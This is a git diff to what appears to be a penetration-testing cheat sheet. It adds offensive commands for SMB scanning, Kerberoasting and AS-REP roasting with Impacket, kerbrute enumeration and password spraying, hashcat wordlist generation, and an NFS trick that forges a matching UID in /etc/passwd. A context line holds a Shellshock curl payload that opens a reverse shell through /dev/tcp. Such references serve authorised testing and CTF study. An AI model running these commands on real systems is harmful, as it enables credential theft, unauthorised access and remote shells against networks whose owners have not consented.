@@ -34,6 +34,12 @@ queryusergroups <RID>
 https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html
 
 ### [SMB Enumeration p445]
+
+### [Enumerating basic information from SMB using MSF]
+```
+use scanner/smb/smb_version
+```
+
 SMBClient
 ```
 smbclient //<IP>/share
@@ -125,13 +131,23 @@ GetNPUsers.py WORKSTATION/ -dc-ip IP -usersfile /path/to/userslist
 GetNPUsers.py NAME.LOCAL/ -dc-ip IP -usersfile /path/to/userslist
 
 python3 GetNPUsers.py <DOMAIN/ -usersfile /path/to/users.txt -dc-ip <DCIP>
+
+python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
+python3 GetNPUsers.py <domain_name>/ -dc-ip <DC-IP> -usersfile user.list
 ```
 
 ### [kerbrute]
 Kerberos enumeration using kerbrute github.com/ropnop/kerbrute dowwnload the release   
 ```
-kerbrute userenum --dc <IP> -d domain.local -o out_kerbuser.txt users.list  
+kerbrute userenum --dc <IP> -d domain.local -o out_kerbuser.txt users.list
+python3 kerbrute.py -users user.list  -passwords pass.txt -domain <domain>
 ```
+
+### [Generating Passwords Thanks to @Legacyy for suggesting this]
+```
+hashcat --force passlist.txt -r /usr/share/hashcat/rules/best64.rule --stdout > passwords.txt
+```
+
 resources:
 
 https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
@@ -166,6 +182,19 @@ adduser <username>
 
 Set ID to mounted users ID
 nano /etc/passwd
+
+
+or
+
+mkdir home
+sudo mount -o nolock <IP>:/home ~/home/
+cd home && ls
+
+cd <target_user>
+if access is denied then replicate an account with the same UUID.
+
+sudo adduser pwn
+sudo sed -i -e 's/1001/1000/g' /etc/passwd
 ```
 unmount NFS
 ```
@@ -201,6 +230,7 @@ smtp-user-enum -M VRFY -U users.txt -t <ipaddr>
 
 ### [ldap]
 ```
+ldapsearch -x -h <IP> -s base namingcontexts
 ldapsearch -x -b "dc=domain,dc=com" -H ldap://ipaddr
 ldapsearch -x -b "dc=domain,dc=com" -H <ipaddr>
 
@@ -317,3 +347,6 @@ curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" <URL>
 ```
 nmap --script-updatedb
 ```
+
+### [java RMI enumeration]
+https://book.hacktricks.xyz/pentesting/1099-pentesting-java-rmi
